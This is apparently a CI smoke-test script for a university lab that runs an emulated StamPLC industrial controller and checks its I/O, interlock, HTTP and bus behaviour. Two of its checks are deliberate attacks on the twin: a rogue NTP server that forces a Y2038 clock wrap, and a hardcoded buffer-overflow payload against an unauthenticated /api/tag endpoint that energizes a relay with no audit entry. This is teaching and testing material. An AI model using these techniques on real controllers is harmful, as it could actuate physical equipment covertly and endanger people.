#!/usr/bin/env python3
"""
CS460 Week-10 StamPLC twin — smoke test.

Boots the committed prebuilt firmware in the QEMU twin and asserts the invariants
the Week-10 lab depends on, so a firmware/image/twin regression is caught in CI:

  1. boot         firmware reaches the `plc>` console
  2. i2cscan      six internal devices (0x20 0x32 0x40 0x43 0x48 0x59) + Wire1 0x77
  3. control      RUN + force di0_start -> relay0 AND relay1 energise
  4. interlock    force di2_estop_in -> motor drops, relay3 (fault lamp) latches
  5. ota          the W5500 HTTP OTA endpoint on :80 advertises /api/upload
  6. hmi          the HMI JSON API on :8080 serves live points
  7. bus/sigrok   the virtual I2C tap decodes to the same 0x59/0x43 transactions
                  a bench logic analyzer would see (sigrok I2C decoder)
  8. ntp/y2038    a rogue SNTP server steps the clock past 2038 -> it wraps to 1901
                  (unauthenticated network time + 32-bit truncation; NTP AiTM lab)
  9. overflow     an unauthenticated overlong /api/tag write overflows into the I/O force
                  image and energizes relay0 by memory corruption, with no audit entry
                  (CWE-787; Part 9 "build break" - the secure build bounds-checks it)

Exit 0 = all checks passed. Any failure exits non-zero.

Defaults to the committed merged image (sbom/firmware/prebuilt/stamplc-factory-8MB.bin,
padded to 8 MB); override with FLASH_IMG=<path>. Needs the twin fetched first
(./qemu/fetch-qemu.sh) and, for the sigrok leg, sigrok-cli on PATH.
"""
import os, sys, socket, select, time, subprocess, signal, tempfile, platform, shutil, re
import urllib.request

ROOT     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PREBUILT = os.path.join(ROOT, "sbom", "firmware", "prebuilt", "stamplc-factory-8MB.bin")
SERIAL   = os.environ.get("SMOKE_SERIAL", "/tmp/plc-smoke-serial")
QMP      = os.environ.get("SMOKE_QMP", "/tmp/plc-smoke-qmp")
TWIN_TAP = os.path.join(ROOT, "bus-analysis", "tools", "twin_tap.sh")

results = []
def check(name, ok, detail=""):
    results.append(ok)
    tag = "PASS" if ok else "FAIL"
    print(f"  [{tag}] {name}" + (f"  ({detail})" if detail else ""), flush=True)
    return ok

def platform_dir():
    key = (platform.system(), platform.machine())
    d = {("Linux","x86_64"):"qemu-twin-linux-x86_64",
         ("Linux","aarch64"):"qemu-twin-linux-arm64",
         ("Darwin","arm64"):"qemu-twin-macos-arm64"}.get(key)
    if not d:
        sys.exit(f"unsupported platform {key[0]}/{key[1]} — build the twin from source")
    return d

def make_image():
    if not os.path.isfile(PREBUILT):
        sys.exit(f"prebuilt not found: {PREBUILT}")
    data = open(PREBUILT, "rb").read()
    if len(data) > 8*1024*1024:
        sys.exit("prebuilt larger than 8 MB")
    img = tempfile.NamedTemporaryFile(delete=False, suffix="-smoke-8MB.bin").name
    with open(img, "wb") as f:
        f.write(data); f.write(b"\xff" * (8*1024*1024 - len(data)))
    return img

# ---- serial console helpers (unix socket exposed by run.sh) ----
def wait_socket(path, timeout=30):
    t0 = time.time()
    while not os.path.exists(path):
        if time.time() - t0 > timeout: return False
        time.sleep(0.2)
    return True

def drain(sock, dur):
    out = b""; end = time.time() + dur
    while time.time() < end:
        r,_,_ = select.select([sock], [], [], 0.2)
        if r:
            try:
                d = sock.recv(4096)
                if d: out += d
            except BlockingIOError:
                pass
    return out.decode("utf-8", "replace")

def cmd(sock, line, wait):
    sock.send(line.encode() + b"\n")
    return drain(sock, wait)

def relay(txt, n):
    m = re.search(rf"relay{n}\s+cmd=\d+\s+act=(\d)", txt)
    return m.group(1) if m else "?"

def poll_relay(sock, want, timeout=20):
    """Send `io` until every relay in want {index: '0'|'1'} matches, or timeout.
    Polls rather than fixed-sleeps because guest<->wall time varies with host speed
    under TCG + -icount (keeps CI on slow runners from flaking)."""
    end = time.time() + timeout; last = ""
    while time.time() < end:
        last = cmd(sock, "io", 1.2)
        if all(relay(last, n) == v for n, v in want.items()):
            return True, last
    return False, last

# ---- HTTP helpers (W5500 bridge binds the guest ports on the host) ----
def http_get(url, timeout=5):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"

def main():
    bdir  = os.path.join(ROOT, "qemu", "twin", platform_dir())
    qemu  = os.path.join(bdir, "qemu-system-xtensa")
    if not os.path.isfile(qemu):
        sys.exit(f"twin not fetched ({qemu}) — run ./qemu/fetch-qemu.sh first")

    img = os.environ.get("FLASH_IMG") or make_image()
    print(f"== StamPLC twin smoke test ==\n  image: {img}\n  qemu : {qemu}", flush=True)

    for p in (SERIAL, QMP):
        try: os.unlink(p)
        except FileNotFoundError: pass

    env = dict(os.environ,
               FLASH_IMG=img, SERIAL_SOCK=SERIAL, QMP_SOCK=QMP,
               ICOUNT="shift=3,align=off,sleep=off")
    proc = subprocess.Popen(["bash", os.path.join(ROOT, "qemu", "run.sh")],
                            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)
    sock = None
    try:
        if not wait_socket(SERIAL, 30):
            check("boot", False, "serial socket never appeared"); return finish()
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(SERIAL); sock.setblocking(False)

        # 1. boot
        boot = ""; t0 = time.time()
        while time.time() - t0 < 40 and "plc>" not in boot:
            boot += drain(sock, 0.5)
        check("boot", "plc>" in boot, "reached plc> console")

        # 2. i2cscan
        scan = cmd(sock, "i2cscan", 2.5)
        internal = [a for a in ("0x20","0x32","0x40","0x43","0x48","0x59")
                    if a in scan.lower().replace("0X","0x")]
        has_wire1 = "0x77" in scan.lower()
        check("i2cscan.internal", len(internal) == 6, f"{len(internal)}/6: {internal}")
        check("i2cscan.wire1_0x77", has_wire1, "BME688 on PORT.A")

        # 3. control: RUN + force di0_start -> relay0 & relay1
        cmd(sock, "mode run", 2.0)
        cmd(sock, "force di0_start 1", 0.5)
        _, io1 = poll_relay(sock, {0: "1", 1: "1"}, timeout=25)
        check("control.di0->relay0", relay(io1,0) == "1", f"relay0 act={relay(io1,0)}")
        check("control.di0->relay1", relay(io1,1) == "1", f"relay1 act={relay(io1,1)}")

        # 4. interlock: force e-stop -> motor drops, relay3 (fault lamp) latches
        cmd(sock, "force di2_estop_in 1", 0.5)
        _, io2 = poll_relay(sock, {0: "0", 3: "1"}, timeout=25)
        check("interlock.estop_drops_motor", relay(io2,0) == "0", f"relay0 act={relay(io2,0)}")
        check("interlock.estop_fault_lamp", relay(io2,3) == "1", f"relay3 act={relay(io2,3)}")
        cmd(sock, "unforce di0_start", 1.0)
        cmd(sock, "unforce di2_estop_in", 1.0)

        # 5/6. HTTP OTA (:80) + HMI (:8080)
        s80, b80 = http_get("http://127.0.0.1:80/")
        check("ota.port80", s80 == 200 and "/api/upload" in b80 and "OTA" in b80,
              f"status={s80}")
        s88, b88 = http_get("http://127.0.0.1:8080/api/points")
        check("hmi.port8080", s88 == 200 and '"mode"' in b88, f"status={s88}")

        # 7/8. NTP AiTM / Y2038: a rogue time server steps the clock past 2038 -> wraps to 1901.
        # The device reaches the host at 127.0.0.1 (the twin maps guest->127.0.0.1 to loopback).
        ntp_state = "/tmp/smoke-ntp-state"
        try: os.unlink(ntp_state)
        except FileNotFoundError: pass
        ntp = subprocess.Popen(
            ["python3", os.path.join(ROOT, "ntp-aitm", "ntp_server.py")],
            env=dict(os.environ, NTP_PORT="12345", NTP_STATE=ntp_state),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            time.sleep(1.5)
            cmd(sock, "ntpsync 127.0.0.1 12345", 6)            # benign
            cb = cmd(sock, "clk", 1.5)
            check("ntp.benign", "no truncation" in cb and "UNSYNCED" not in cb,
                  "clk shows a current, un-truncated date")
            with open(ntp_state, "w") as f: f.write("arm")     # arm the rogue server
            cmd(sock, "ntpsync 127.0.0.1 12345", 6)            # spoof a time > 2038
            cw = cmd(sock, "clk", 1.5)
            check("ntp.y2038_wrap", "WRAPPED" in cw, "clk wraps to ~1901 after the spoof")
        finally:
            ntp.terminate()
            try: os.unlink(ntp_state)
            except FileNotFoundError: pass

        # 8. CWE-787 overflow -> relay force (Part 9 "build break"): an unauthenticated,
        #    overlong /api/tag write overflows a scratch buffer into the I/O force image and
        #    energizes relay0 by memory corruption - with NO FORCE entry in the audit log
        #    (plc_force_coil was never called). Payload from tools/derive-force-offset.py;
        #    stable while the ForceImage struct is unchanged (CI catches a layout change here).
        OVF = "00"*32 + "0200000000000000" + "0200000000000000"
        cmd(sock, "unforce di0_start", 0.8)                 # relay0 logic-OFF baseline
        base_ok = relay(cmd(sock, "io", 1.2), 0) == "0"
        _, b_tag = http_get("http://127.0.0.1:8080/api/tag?data=" + OVF)
        forced_ok, _ = poll_relay(sock, {0: "1"}, timeout=15)
        check("overflow.force_relay0", base_ok and forced_ok and "tag_bytes" in (b_tag or ""),
              "unauth /api/tag overflow energizes relay0 by memory corruption")
        logv = cmd(sock, "log", 2.0)
        check("overflow.no_audit", "FORCE coil 1" not in logv,
              "corruption force leaves no FORCE audit entry (phantom force)")
    finally:
        if sock: sock.close()
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=10)
        except Exception:
            try: os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception: pass

    # 7. bus tap -> sigrok decode (bench parity) — separate twin instance
    if shutil.which("sigrok-cli") is None:
        check("bus.sigrok", False, "sigrok-cli not installed")
    else:
        workdir = tempfile.mkdtemp(prefix="smoke-bus-")
        tapenv = dict(os.environ, FLASH_IMG=img, BUS="i2c0", RUN="6", OUT="bus")
        tap = subprocess.run(["bash", TWIN_TAP], cwd=workdir, env=tapenv,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=120)
        vcd = os.path.join(workdir, "bus.vcd")
        if not os.path.isfile(vcd):
            check("bus.capture", False, "twin_tap produced no VCD")
        else:
            check("bus.capture", True, "virtual tap -> bus.vcd")
            dec = subprocess.run(
                ["sigrok-cli","-i",vcd,"-P","i2c:scl=SCL:sda=SDA","-A","i2c"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=60
            ).stdout.decode("utf-8","replace")
            addr = {ln.split(":")[-1].strip() for ln in dec.splitlines() if "Address" in ln}
            check("bus.sigrok.relay_0x59", "59" in addr, "0x59 AW9523 relays decoded")
            check("bus.sigrok.di_0x43", "43" in addr, "0x43 PI4IOE inputs decoded")
        shutil.rmtree(workdir, ignore_errors=True)
    if os.environ.get("FLASH_IMG") is None:
        try: os.unlink(img)
        except Exception: pass
    return finish()

def finish():
    npass = sum(results); n = len(results)
    print(f"\n== {npass}/{n} checks passed ==", flush=True)
    return 0 if npass == n and n > 0 else 1

if __name__ == "__main__":
    sys.exit(main())
